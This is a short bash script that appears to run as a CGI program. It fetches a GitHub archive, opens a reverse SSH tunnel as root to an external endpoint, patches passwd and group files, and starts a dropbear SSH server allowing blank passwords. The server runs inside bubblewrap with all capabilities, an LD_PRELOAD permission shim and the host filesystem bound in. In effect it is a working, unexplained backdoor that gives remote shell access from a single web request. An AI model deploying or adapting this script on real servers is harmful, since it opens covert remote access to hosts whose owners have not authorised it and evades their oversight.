#!/usr/bin/bash
## vars
EP=
EP_PORT=
## avoid 500
echo -e 'Content-Type: text/plain\n'

## get fs
wget https://github.com/untoreh/throwaway/archive/master.zip
tar xf master.zip
rm master.zip
mv throwaway-master throwaway

## parse url to allow commands flags
# shopt -s expand_aliases
# alias urldecode='python -c "import sys, urllib as ul; \
    # print ul.unquote_plus(sys.argv[1])"'

## parse vars (for interactive use)
# saveIFS=$IFS
# IFS='=&'
# parm=($QUERY_STRING)
# IFS=$saveIFS
# for ((i=0; i<${#parm[@]}; i+=2))
# do
#     declare var_${parm[i]}=${parm[i+1]}
# done

## reverse connection
ssh -TNfy -R 9999:127.0.0.1:9999 root@$EP  -p $EP_PORT -i ~/.ssh/settler

## correct uid and gid in rootfs, username: settler, id: 1000
uname=settler
uid=$(id -u)
sed 's/1000/'$uid'/' -i $ALP/etc/passwd
gid=$(id -g)
sed 's/1000/'$gid'/' -i $ALP/etc/group

## bwrap dropbear
$ALP/bin/bwrap --setenv LD_PRELOAD /lib/dumbperms.so \
               --setenv PATH /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin \
               --bind / /sysroot \
               --bind $ALP / \
               --bind $BASE /home/$uname \
               --proc /proc \
               --dev-bind /dev /dev \
               --cap-add ALL \
               --tmpfs /tmp \
               --tmpfs /run \
               --tmpfs /var/run \
               /usr/sbin/dropbear -BERF -p 12322
